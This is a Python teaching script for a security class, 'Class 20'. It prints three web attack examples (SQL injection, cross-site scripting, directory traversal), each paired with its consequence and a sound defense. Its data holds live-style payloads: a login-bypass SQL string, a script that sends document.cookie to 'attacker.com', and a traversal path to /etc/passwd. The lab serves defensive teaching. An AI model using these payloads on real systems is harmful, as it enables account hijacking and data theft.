#!/usr/bin/env python3
"""Class 20: Web Application Attack Path & Input Vulnerability Simulator.

Run: python app_attacks_sim.py
"""
import sys

if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")

ATTACKS = [
    {
        "category": "SQL Injection (SQLi)",
        "vulnerable_input": "' OR '1'='1' --",
        "backend_logic": "SELECT * FROM users WHERE username = '' OR '1'='1' --' AND pass = '...'",
        "consequence": "Bypasses password verification; dumps entire customer database table.",
        "defense": "Use Parameterized Queries / Prepared Statements (never concatenate user strings into SQL).",
    },
    {
        "category": "Cross-Site Scripting (XSS)",
        "vulnerable_input": "<script>fetch('http://attacker.com/steal?cookie=' + document.cookie);</script>",
        "backend_logic": "Web page reflects raw input directly into the browser HTML document without encoding.",
        "consequence": "Attacker steals victim's active session cookie, enabling full account hijacking.",
        "defense": "Context-aware HTML/JavaScript Output Encoding; set HttpOnly cookie flags.",
    },
    {
        "category": "Path / Directory Traversal",
        "vulnerable_input": "../../../../etc/passwd",
        "backend_logic": "open('/var/www/uploads/' + filename).read()",
        "consequence": "Attacker escapes the web root directory and reads sensitive operating system files.",
        "defense": "Whitelist allowed filenames; strictly sanitize and resolve canonical absolute paths.",
    },
]


def main():
    print("=" * 70)
    print("  CLASS 20: APPLICATION ATTACK PATHS & INPUT HANDLING LAB")
    print("=" * 70)

    for a in ATTACKS:
        print(f"\n[ATTACK CATEGORY]: {a['category']}")
        print(f"  Malicious Payload : {a['vulnerable_input']}")
        print(f"  Vulnerable Logic  : {a['backend_logic']}")
        print(f"  Technical Impact  : [!] {a['consequence']}")
        print(f"  Secure Defense    : --> {a['defense']}")
        print("-" * 70)


if __name__ == "__main__":
    main()
